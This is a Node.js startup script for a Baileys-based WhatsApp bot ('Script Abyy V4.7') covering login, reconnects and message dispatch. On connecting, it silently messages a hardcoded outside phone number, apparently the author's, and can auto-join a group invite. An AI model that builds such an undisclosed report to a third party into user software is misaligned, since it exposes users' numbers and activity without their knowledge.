require("./database/global")
const func = require("./database/place")
const readline = require("readline");
const usePairingCode = true
const question = (text) => {
const rl = readline.createInterface({
input: process.stdin,
output: process.stdout
});
return new Promise((resolve) => {
rl.question(text, resolve)
})
};
async function startSesi() {
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) })
const { state, saveCreds } = await useMultiFileAuthState(`./session`)
const { version, isLatest } = await fetchLatestBaileysVersion()
console.log(chalk.yellow.bold('Script Abyy V4.7\nsubscribe https://youtube.com/@abyyyferrr\n\nTQ TO\n\nALLAH SWT\nORANG TUA\nPEMBUAT SCRIPT LAINNYA'))
const connectionOptions = {
version,
keepAliveIntervalMs: 30000,
printQRInTerminal: !usePairingCode,
logger: pino({ level: "fatal" }),
auth: state,
browser: [ "Ubuntu", "Chrome", "20.0.04" ]
// browser: ['Chrome (Linux)', '', '']
}
const byxx = func.makeWASocket(connectionOptions)
if(usePairingCode && !byxx.authState.creds.registered) {
const phoneNumber = await question(chalk.green('\nEnter Your Number\nNumber : '));
const code = await byxx.requestPairingCode(phoneNumber.trim())
console.log(chalk.green(`Your Pairing Code : ${code} `))
}
store.bind(byxx.ev)
byxx.ev.on('connection.update', async (update) => {
const { connection, lastDisconnect } = update
if (connection === 'close') {
const reason = new Boom(lastDisconnect?.error)?.output.statusCode
console.log(color(lastDisconnect.error, 'deeppink'))
if (lastDisconnect.error == 'Error: Stream Errored (unknown)') {
process.exit()
} else if (reason === DisconnectReason.badSession) {
console.log(color(`Bad Session File, Please Delete Session and Scan Again`))
process.exit()
} else if (reason === DisconnectReason.connectionClosed) {
console.log(color('[SYSTEM]', 'white'), color('Connection closed, reconnecting...', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionLost) {
console.log(color('[SYSTEM]', 'white'), color('Connection lost, trying to reconnect', 'deeppink'))
process.exit()
} else if (reason === DisconnectReason.connectionReplaced) {
console.log(color('Connection Replaced, Another New Session Opened, Please Close Current Session First'))
byxx.logout()
} else if (reason === DisconnectReason.loggedOut) {
console.log(color(`Device Logged Out, Please Scan Again And Run.`))
byxx.logout()
} else if (reason === DisconnectReason.restartRequired) {
console.log(color('Restart Required, Restarting...'))
await startSesi()
} else if (reason === DisconnectReason.timedOut) {
console.log(color('Connection TimedOut, Reconnecting...'))
startSesi()
}
} else if (connection === "connecting") {
start(`1`, `Connecting...`)
} else if (connection === "open") {
success(`1`, `Tersambung`)
byxx.sendMessage(`6282127568219@s.whatsapp.net`, { text: `\`HI BUNG HARI YANG CERAH\`
botnya berhasil terconnect ya bung✅ `})
if (autoJoin) {
byxx.groupAcceptInvite(codeInvite)
}
}
})
byxx.ev.on('messages.upsert', async (chatUpdate) => {
try {
m = chatUpdate.messages[0]
if (!m.message) return
m.message = (Object.keys(m.message)[0] === 'ephemeralMessage') ? m.message.ephemeralMessage.message : m.message
if (m.key && m.key.remoteJid === 'status@broadcast') return byxx.readMessages([m.key])
if (!byxx.public && !m.key.fromMe && chatUpdate.type === 'notify') return
if (m.key.id.startsWith('BAE5') && m.key.id.length === 16) return
m = func.smsg(byxx, m, store)
require("./rabyyx")(byxx, m, store)
} catch (err) {
console.log(err)
}
})
byxx.ev.on('contacts.update', (update) => {
for (let contact of update) {
let id = byxx.decodeJid(contact.id)
if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
}
})
byxx.public = true
byxx.ev.on('creds.update', saveCreds)
return byxx
}
startSesi()
process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
